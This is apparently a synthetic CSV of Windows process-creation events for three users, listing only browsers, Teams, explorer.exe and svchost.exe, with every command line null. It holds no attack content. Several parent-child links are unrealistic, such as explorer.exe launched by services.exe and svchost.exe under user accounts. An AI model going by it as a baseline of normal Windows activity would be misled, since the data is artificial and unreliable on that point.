Hostname,Username,ProcessName,ProcessID,ParentProcessName,ParentProcessID,CommandLine,EventTimestamp
winws1235,a.smith,chrome.exe,14801,explorer.exe,5080,null,2025-09-15 08:29:21.456345 UTC
winws1091,a.smith,chrome.exe,21501,explorer.exe,6550,null,2025-09-15 08:42:42.456345 UTC
winws1071,a.smith,chrome.exe,16501,explorer.exe,5450,null,2025-09-15 08:32:42.789678 UTC
winws0121,a.smith,chrome.exe,18401,explorer.exe,5860,null,2025-09-15 08:36:27.789678 UTC
winws0101,a.smith,chrome.exe,13401,explorer.exe,4760,null,2025-09-15 08:26:27.123012 UTC
winws1051,a.smith,chrome.exe,11501,explorer.exe,4350,null,2025-09-15 08:22:42.123012 UTC
winws0141,a.smith,chrome.exe,23401,explorer.exe,6960,null,2025-09-15 08:46:27.456345 UTC
winws0091,a.smith,chrome.exe,10901,explorer.exe,4210,null,2025-09-15 08:21:27.789678 UTC
winws1245,a.smith,chrome.exe,16101,explorer.exe,5360,null,2025-09-15 08:31:51.123012 UTC
winws1205,a.smith,chrome.exe,11101,explorer.exe,4260,null,2025-09-15 08:21:51.456345 UTC
winws1275,a.smith,chrome.exe,19801,explorer.exe,6180,null,2025-09-15 08:39:21.123012 UTC
winws1285,a.smith,chrome.exe,21101,explorer.exe,6460,null,2025-09-15 08:41:51.789678 UTC
winws0255,a.smith,explorer.exe,7000,services.exe,500,null,2025-09-15 08:46:48.789678 UTC
winws1212,a.smith,explorer.exe,4440,services.exe,500,null,2025-09-15 08:23:30.456345 UTC
winws0116,a.smith,explorer.exe,5590,services.exe,500,null,2025-09-15 08:33:57.123012 UTC
winws1292,a.smith,explorer.exe,6640,services.exe,500,null,2025-09-15 08:43:30.789678 UTC
winws0178,a.smith,explorer.exe,4850,services.exe,500,null,2025-09-15 08:27:18.789678 UTC
winws1086,a.smith,explorer.exe,6270,services.exe,500,null,2025-09-15 08:40:12.789678 UTC
winws0237,a.smith,explorer.exe,6500,services.exe,500,null,2025-09-15 08:42:18.789678 UTC
winws0217,a.smith,explorer.exe,5950,services.exe,500,null,2025-09-15 08:37:18.456345 UTC
winws1104,a.smith,explorer.exe,7260,services.exe,500,null,2025-09-15 08:49:12.789678 UTC
winws0171,a.smith,explorer.exe,4670,services.exe,500,null,2025-09-15 08:25:33.123012 UTC
winws0263,a.smith,explorer.exe,7220,services.exe,500,null,2025-09-15 08:48:48.123012 UTC
winws0030,a.smith,explorer.exe,4300,services.exe,500,null,2025-09-15 08:05:15.789012 UTC
winws0096,a.smith,explorer.exe,4490,services.exe,500,null,2025-09-15 08:23:57.456345 UTC
winws0208,a.smith,explorer.exe,5680,services.exe,500,null,2025-09-15 08:34:48.789678 UTC
winws0266,a.smith,explorer.exe,7310,services.exe,500,null,2025-09-15 08:49:33.123012 UTC
winws1232,a.smith,explorer.exe,4990,services.exe,500,null,2025-09-15 08:28:30.789678 UTC
winws0247,a.smith,explorer.exe,6780,services.exe,500,null,2025-09-15 08:44:48.456345 UTC
winws0198,a.smith,explorer.exe,5400,services.exe,500,null,2025-09-15 08:32:18.123012 UTC
winws0106,a.smith,explorer.exe,5040,services.exe,500,null,2025-09-15 08:28:57.789678 UTC
winws0230,a.smith,explorer.exe,6320,services.exe,500,null,2025-09-15 08:40:33.123012 UTC
winws0158,a.smith,explorer.exe,4300,services.exe,500,null,2025-09-15 08:22:18.456345 UTC
winws1056,a.smith,explorer.exe,4620,services.exe,500,null,2025-09-15 08:25:12.789678 UTC
winws0188,a.smith,explorer.exe,5130,services.exe,500,null,2025-09-15 08:29:48.456345 UTC
winws1076,a.smith,explorer.exe,5720,services.exe,500,null,2025-09-15 08:35:12.456345 UTC
winws0227,a.smith,explorer.exe,6230,services.exe,500,null,2025-09-15 08:39:48.123012 UTC
winws0191,a.smith,explorer.exe,5220,services.exe,500,null,2025-09-15 08:30:33.456345 UTC
winws0168,a.smith,explorer.exe,4580,services.exe,500,null,2025-09-15 08:24:48.123012 UTC
winws0136,a.smith,explorer.exe,6690,services.exe,500,null,2025-09-15 08:43:57.789678 UTC
winws1308,a.smith,explorer.exe,7080,services.exe,500,null,2025-09-15 08:47:30.456345 UTC
winws1066,a.smith,explorer.exe,5170,services.exe,500,null,2025-09-15 08:30:12.123012 UTC
winws1272,a.smith,explorer.exe,6090,services.exe,500,null,2025-09-15 08:38:30.456345 UTC
winws1100,a.smith,explorer.exe,7040,services.exe,500,null,2025-09-15 08:47:12.456345 UTC
winws0140,a.smith,explorer.exe,6910,services.exe,500,null,2025-09-15 08:45:57.123012 UTC
winws0250,a.smith,explorer.exe,6870,services.exe,500,null,2025-09-15 08:45:33.456345 UTC
winws1096,a.smith,explorer.exe,6820,services.exe,500,null,2025-09-15 08:45:12.123012 UTC
winws0210,a.smith,explorer.exe,5770,services.exe,500,null,2025-09-15 08:35:33.789678 UTC
winws0126,a.smith,explorer.exe,6140,services.exe,500,null,2025-09-15 08:38:57.456345 UTC
winws1252,a.smith,explorer.exe,5540,services.exe,500,null,2025-09-15 08:33:30.123012 UTC
winws0144,a.smith,explorer.exe,7130,services.exe,500,null,2025-09-15 08:47:57.456345 UTC
winws1255,a.smith,msedge.exe,17301,explorer.exe,5630,null,2025-09-15 08:34:21.789678 UTC
winws0161,a.smith,msedge.exe,11701,explorer.exe,4390,null,2025-09-15 08:23:03.456345 UTC
winws1081,a.smith,msedge.exe,19001,explorer.exe,6000,null,2025-09-15 08:37:42.123012 UTC
winws1295,a.smith,msedge.exe,22301,explorer.exe,6730,null,2025-09-15 08:44:21.456345 UTC
winws0201,a.smith,msedge.exe,16701,explorer.exe,5490,null,2025-09-15 08:33:03.123012 UTC
winws0240,a.smith,msedge.exe,21701,explorer.exe,6590,null,2025-09-15 08:43:03.789678 UTC
winws1319,a.smith,msedge.exe,25301,explorer.exe,7390,null,2025-09-15 08:50:21.456345 UTC
winws1061,a.smith,msedge.exe,14001,explorer.exe,4900,null,2025-09-15 08:27:42.456345 UTC
winws1311,a.smith,msedge.exe,24301,explorer.exe,7170,null,2025-09-15 08:48:21.123012 UTC
winws1215,a.smith,msedge.exe,12301,explorer.exe,4530,null,2025-09-15 08:24:21.123012 UTC
winws1202,a.smith,msedge.exe,10701,explorer.exe,4160,null,2025-09-15 08:21:00.789678 UTC
winws1222,a.smith,svchost.exe,3200,services.exe,500,null,2025-09-15 08:26:00.123012 UTC
winws1318,a.smith,svchost.exe,10400,services.exe,500,null,2025-09-15 08:50:00.123012 UTC
winws1262,a.smith,svchost.exe,6200,services.exe,500,null,2025-09-15 08:36:00.789678 UTC
winws1242,a.smith,svchost.exe,4700,services.exe,500,null,2025-09-15 08:31:00.456345 UTC
winws1282,a.smith,svchost.exe,7700,services.exe,500,null,2025-09-15 08:41:00.123012 UTC
winws0220,a.smith,teams.exe,19201,explorer.exe,6040,null,2025-09-15 08:38:03.456345 UTC
winws0151,a.smith,teams.exe,10501,explorer.exe,4130,null,2025-09-15 08:20:33.789678 UTC
winws0111,a.smith,teams.exe,15901,explorer.exe,5310,null,2025-09-15 08:31:27.456345 UTC
winws1265,a.smith,teams.exe,18601,explorer.exe,5910,null,2025-09-15 08:36:51.456345 UTC
winws0131,a.smith,teams.exe,20901,explorer.exe,6410,null,2025-09-15 08:41:27.123012 UTC
winws0181,a.smith,teams.exe,14201,explorer.exe,4940,null,2025-09-15 08:28:03.789678 UTC
winws1225,a.smith,teams.exe,13601,explorer.exe,4810,null,2025-09-15 08:26:51.789678 UTC
winws0129,d.kim,chrome.exe,20401,explorer.exe,6300,null,2025-09-15 08:40:27.456345 UTC
winws0089,d.kim,chrome.exe,10401,explorer.exe,4070,null,2025-09-15 08:15:28.123789 UTC
winws1079,d.kim,chrome.exe,18501,explorer.exe,5890,null,2025-09-15 08:36:42.456345 UTC
winws1261,d.kim,chrome.exe,18101,explorer.exe,5800,null,2025-09-15 08:35:51.789678 UTC
winws1211,d.kim,chrome.exe,11801,explorer.exe,4420,null,2025-09-15 08:23:21.456345 UTC
winws0109,d.kim,chrome.exe,15401,explorer.exe,5200,null,2025-09-15 08:30:27.789678 UTC
winws1221,d.kim,chrome.exe,13101,explorer.exe,4700,null,2025-09-15 08:25:51.123012 UTC
winws1291,d.kim,chrome.exe,21801,explorer.exe,6620,null,2025-09-15 08:43:21.789678 UTC
winws1251,d.kim,chrome.exe,16801,explorer.exe,5520,null,2025-09-15 08:33:21.123012 UTC
winws1059,d.kim,chrome.exe,13501,explorer.exe,4790,null,2025-09-15 08:26:42.789678 UTC
winws1315,d.kim,chrome.exe,24801,explorer.exe,7280,null,2025-09-15 08:49:21.789678 UTC
winws1307,d.kim,chrome.exe,23801,explorer.exe,7060,null,2025-09-15 08:47:21.456345 UTC
winws1268,d.kim,explorer.exe,5980,services.exe,500,null,2025-09-15 08:37:30.789678 UTC
winws0243,d.kim,explorer.exe,6670,services.exe,500,null,2025-09-15 08:43:48.789678 UTC
winws1248,d.kim,explorer.exe,5430,services.exe,500,null,2025-09-15 08:32:30.456345 UTC
winws1102,d.kim,explorer.exe,7150,services.exe,500,null,2025-09-15 08:48:12.123012 UTC
winws0094,d.kim,explorer.exe,4380,services.exe,500,null,2025-09-15 08:22:57.789678 UTC
winws0194,d.kim,explorer.exe,5290,services.exe,500,null,2025-09-15 08:31:18.456345 UTC
winws1228,d.kim,explorer.exe,4880,services.exe,500,null,2025-09-15 08:27:30.123012 UTC
winws0254,d.kim,explorer.exe,6980,services.exe,500,null,2025-09-15 08:46:33.123012 UTC
winws1208,d.kim,explorer.exe,4330,services.exe,500,null,2025-09-15 08:22:30.789678 UTC
winws1288,d.kim,explorer.exe,6530,services.exe,500,null,2025-09-15 08:42:30.123012 UTC
winws0207,d.kim,explorer.exe,5660,services.exe,500,null,2025-09-15 08:34:33.123012 UTC
winws0269,d.kim,explorer.exe,7420,services.exe,500,null,2025-09-15 08:50:33.789678 UTC
winws0204,d.kim,explorer.exe,5570,services.exe,500,null,2025-09-15 08:33:48.123012 UTC
winws0167,d.kim,explorer.exe,4560,services.exe,500,null,2025-09-15 08:24:33.456345 UTC
winws0174,d.kim,explorer.exe,4740,services.exe,500,null,2025-09-15 08:26:18.123012 UTC
winws0187,d.kim,explorer.exe,5110,services.exe,500,null,2025-09-15 08:29:33.789678 UTC
winws1106,d.kim,explorer.exe,7370,services.exe,500,null,2025-09-15 08:50:12.456345 UTC
winws0267,d.kim,explorer.exe,7330,services.exe,500,null,2025-09-15 08:49:48.789678 UTC
winws1084,d.kim,explorer.exe,6160,services.exe,500,null,2025-09-15 08:39:12.123012 UTC
winws0114,d.kim,explorer.exe,5480,services.exe,500,null,2025-09-15 08:32:57.456345 UTC
winws1054,d.kim,explorer.exe,4510,services.exe,500,null,2025-09-15 08:24:12.123012 UTC
winws0246,d.kim,explorer.exe,6760,services.exe,500,null,2025-09-15 08:44:33.789678 UTC
winws0262,d.kim,explorer.exe,7200,services.exe,500,null,2025-09-15 08:48:33.456345 UTC
winws0259,d.kim,explorer.exe,7110,services.exe,500,null,2025-09-15 08:47:48.456345 UTC
winws0164,d.kim,explorer.exe,4470,services.exe,500,null,2025-09-15 08:23:48.456345 UTC
winws0124,d.kim,explorer.exe,6030,services.exe,500,null,2025-09-15 08:37:57.789678 UTC
winws1201,d.kim,explorer.exe,4150,services.exe,500,null,2025-09-15 08:20:51.789678 UTC
winws0213,d.kim,explorer.exe,5840,services.exe,500,null,2025-09-15 08:36:18.789678 UTC
winws0184,d.kim,explorer.exe,5020,services.exe,500,null,2025-09-15 08:28:48.789678 UTC
winws0104,d.kim,explorer.exe,4930,services.exe,500,null,2025-09-15 08:27:57.123012 UTC
winws0233,d.kim,explorer.exe,6390,services.exe,500,null,2025-09-15 08:41:18.123012 UTC
winws0134,d.kim,explorer.exe,6580,services.exe,500,null,2025-09-15 08:42:57.123012 UTC
winws0223,d.kim,explorer.exe,6120,services.exe,500,null,2025-09-15 08:38:48.456345 UTC
winws1074,d.kim,explorer.exe,5610,services.exe,500,null,2025-09-15 08:34:12.789678 UTC
winws1064,d.kim,explorer.exe,5060,services.exe,500,null,2025-09-15 08:29:12.456345 UTC
winws0226,d.kim,explorer.exe,6210,services.exe,500,null,2025-09-15 08:39:33.456345 UTC
winws1271,d.kim,msedge.exe,19301,explorer.exe,6070,null,2025-09-15 08:38:21.456345 UTC
winws0216,d.kim,msedge.exe,18701,explorer.exe,5930,null,2025-09-15 08:37:03.789678 UTC
winws1231,d.kim,msedge.exe,14301,explorer.exe,4970,null,2025-09-15 08:28:21.789678 UTC
winws1089,d.kim,msedge.exe,21001,explorer.exe,6440,null,2025-09-15 08:41:42.789678 UTC
winws0177,d.kim,msedge.exe,13701,explorer.exe,4830,null,2025-09-15 08:27:03.123012 UTC
winws1049,d.kim,msedge.exe,11001,explorer.exe,4240,null,2025-09-15 08:21:42.456345 UTC
winws1069,d.kim,msedge.exe,16001,explorer.exe,5340,null,2025-09-15 08:31:42.123012 UTC
winws1238,d.kim,svchost.exe,4400,services.exe,500,null,2025-09-15 08:30:00.789678 UTC
winws1218,d.kim,svchost.exe,2900,services.exe,500,null,2025-09-15 08:25:00.456345 UTC
winws1278,d.kim,svchost.exe,7400,services.exe,500,null,2025-09-15 08:40:00.456345 UTC
winws1306,d.kim,svchost.exe,9500,services.exe,500,null,2025-09-15 08:47:00.123012 UTC
winws1314,d.kim,svchost.exe,10100,services.exe,500,null,2025-09-15 08:49:00.456345 UTC
winws1258,d.kim,svchost.exe,5900,services.exe,500,null,2025-09-15 08:35:00.123012 UTC
winws1298,d.kim,svchost.exe,8900,services.exe,500,null,2025-09-15 08:45:00.789678 UTC
winws0119,d.kim,teams.exe,17901,explorer.exe,5750,null,2025-09-15 08:35:27.123012 UTC
winws1241,d.kim,teams.exe,15601,explorer.exe,5250,null,2025-09-15 08:30:51.456345 UTC
winws0157,d.kim,teams.exe,11201,explorer.exe,4280,null,2025-09-15 08:22:03.789678 UTC
winws0197,d.kim,teams.exe,16201,explorer.exe,5380,null,2025-09-15 08:32:03.456345 UTC
winws0236,d.kim,teams.exe,21201,explorer.exe,6480,null,2025-09-15 08:42:03.123012 UTC
winws1281,d.kim,teams.exe,20601,explorer.exe,6350,null,2025-09-15 08:40:51.123012 UTC
winws0154,d.kim,teams.exe,10801,explorer.exe,4190,null,2025-09-15 08:21:18.789678 UTC
winws0252,d.kim,teams.exe,23201,explorer.exe,6920,null,2025-09-15 08:46:03.789678 UTC
winws0099,d.kim,teams.exe,12901,explorer.exe,4650,null,2025-09-15 08:25:27.456345 UTC
winws0139,d.kim,teams.exe,22901,explorer.exe,6850,null,2025-09-15 08:45:27.789678 UTC
winws1301,j.doe,chrome.exe,23101,explorer.exe,6900,null,2025-09-15 08:45:51.456345 UTC
winws1293,j.doe,chrome.exe,22101,explorer.exe,6680,null,2025-09-15 08:43:51.123012 UTC
winws1243,j.doe,chrome.exe,15801,explorer.exe,5300,null,2025-09-15 08:31:21.789678 UTC
winws1253,j.doe,chrome.exe,17101,explorer.exe,5580,null,2025-09-15 08:33:51.456345 UTC
winws1055,j.doe,chrome.exe,12501,explorer.exe,4570,null,2025-09-15 08:24:42.456345 UTC
winws0012,j.doe,chrome.exe,10012,explorer.exe,4050,null,2025-09-15 08:05:10.123456 UTC
winws1075,j.doe,chrome.exe,17501,explorer.exe,5670,null,2025-09-15 08:34:42.123012 UTC
winws0105,j.doe,chrome.exe,14401,explorer.exe,4980,null,2025-09-15 08:28:27.456345 UTC
winws1309,j.doe,chrome.exe,24101,explorer.exe,7120,null,2025-09-15 08:47:51.789678 UTC
winws1317,j.doe,chrome.exe,25101,explorer.exe,7340,null,2025-09-15 08:49:51.123012 UTC
winws1103,j.doe,chrome.exe,24501,explorer.exe,7210,null,2025-09-15 08:48:42.456345 UTC
winws1095,j.doe,chrome.exe,22501,explorer.exe,6770,null,2025-09-15 08:44:42.789678 UTC
winws1283,j.doe,chrome.exe,20801,explorer.exe,6400,null,2025-09-15 08:41:21.456345 UTC
winws1099,j.doe,chrome.exe,23501,explorer.exe,6990,null,2025-09-15 08:46:42.123012 UTC
winws1213,j.doe,chrome.exe,12101,explorer.exe,4480,null,2025-09-15 08:23:51.789678 UTC
winws0125,j.doe,chrome.exe,19401,explorer.exe,6080,null,2025-09-15 08:38:27.123012 UTC
winws0269,j.doe,explorer.exe,7380,services.exe,500,null,2025-09-15 08:50:18.123012 UTC
winws0215,j.doe,explorer.exe,5900,services.exe,500,null,2025-09-15 08:36:48.123012 UTC
winws0206,j.doe,explorer.exe,5620,services.exe,500,null,2025-09-15 08:34:18.456345 UTC
winws0110,j.doe,explorer.exe,5260,services.exe,500,null,2025-09-15 08:30:57.123012 UTC
winws1203,j.doe,explorer.exe,4200,services.exe,500,null,2025-09-15 08:21:21.123012 UTC
winws0166,j.doe,explorer.exe,4520,services.exe,500,null,2025-09-15 08:24:18.789678 UTC
winws0130,j.doe,explorer.exe,6360,services.exe,500,null,2025-09-15 08:40:57.789678 UTC
winws0238,j.doe,explorer.exe,6540,services.exe,500,null,2025-09-15 08:42:33.456345 UTC
winws1300,j.doe,explorer.exe,6860,services.exe,500,null,2025-09-15 08:45:30.123012 UTC
winws0176,j.doe,explorer.exe,4800,services.exe,500,null,2025-09-15 08:26:48.456345 UTC
winws1050,j.doe,explorer.exe,4290,services.exe,500,null,2025-09-15 08:22:12.789678 UTC
winws0199,j.doe,explorer.exe,5440,services.exe,500,null,2025-09-15 08:32:33.789678 UTC
winws0120,j.doe,explorer.exe,5810,services.exe,500,null,2025-09-15 08:35:57.456345 UTC
winws0179,j.doe,explorer.exe,4890,services.exe,500,null,2025-09-15 08:27:33.456345 UTC
winws0218,j.doe,explorer.exe,5990,services.exe,500,null,2025-09-15 08:37:33.123012 UTC
winws0150,j.doe,explorer.exe,4120,services.exe,500,null,2025-09-15 08:20:30.456345 UTC
winws0235,j.doe,explorer.exe,6450,services.exe,500,null,2025-09-15 08:41:48.456345 UTC
winws1280,j.doe,explorer.exe,6310,services.exe,500,null,2025-09-15 08:40:30.789678 UTC
winws0159,j.doe,explorer.exe,4340,services.exe,500,null,2025-09-15 08:22:33.123012 UTC
winws1316,j.doe,explorer.exe,7300,services.exe,500,null,2025-09-15 08:49:30.789678 UTC
winws1080,j.doe,explorer.exe,5940,services.exe,500,null,2025-09-15 08:37:12.789678 UTC
winws1090,j.doe,explorer.exe,6490,services.exe,500,null,2025-09-15 08:42:12.123012 UTC
winws0225,j.doe,explorer.exe,6170,services.exe,500,null,2025-09-15 08:39:18.789678 UTC
winws1240,j.doe,explorer.exe,5210,services.exe,500,null,2025-09-15 08:30:30.123012 UTC
winws0186,j.doe,explorer.exe,5070,services.exe,500,null,2025-09-15 08:29:18.123012 UTC
winws0245,j.doe,explorer.exe,6720,services.exe,500,null,2025-09-15 08:44:18.123012 UTC
winws0100,j.doe,explorer.exe,4710,services.exe,500,null,2025-09-15 08:25:57.789678 UTC
winws0156,j.doe,explorer.exe,4250,services.exe,500,null,2025-09-15 08:21:48.123012 UTC
winws1060,j.doe,explorer.exe,4840,services.exe,500,null,2025-09-15 08:27:12.123012 UTC
winws0253,j.doe,explorer.exe,6940,services.exe,500,null,2025-09-15 08:46:18.456345 UTC
winws0196,j.doe,explorer.exe,5350,services.exe,500,null,2025-09-15 08:31:48.789678 UTC
winws1260,j.doe,explorer.exe,5760,services.exe,500,null,2025-09-15 08:35:30.456345 UTC
winws0261,j.doe,explorer.exe,7160,services.exe,500,null,2025-09-15 08:48:18.789678 UTC
winws1220,j.doe,explorer.exe,4660,services.exe,500,null,2025-09-15 08:25:30.789678 UTC
winws1263,j.doe,msedge.exe,18301,explorer.exe,5850,null,2025-09-15 08:36:21.123012 UTC
winws0264,j.doe,msedge.exe,24701,explorer.exe,7250,null,2025-09-15 08:49:03.789678 UTC
winws1065,j.doe,msedge.exe,15001,explorer.exe,5120,null,2025-09-15 08:29:42.789678 UTC
winws1085,j.doe,msedge.exe,20001,explorer.exe,6220,null,2025-09-15 08:39:42.456345 UTC
winws0209,j.doe,msedge.exe,17701,explorer.exe,5710,null,2025-09-15 08:35:03.456345 UTC
winws1223,j.doe,msedge.exe,13301,explorer.exe,4750,null,2025-09-15 08:26:21.456345 UTC
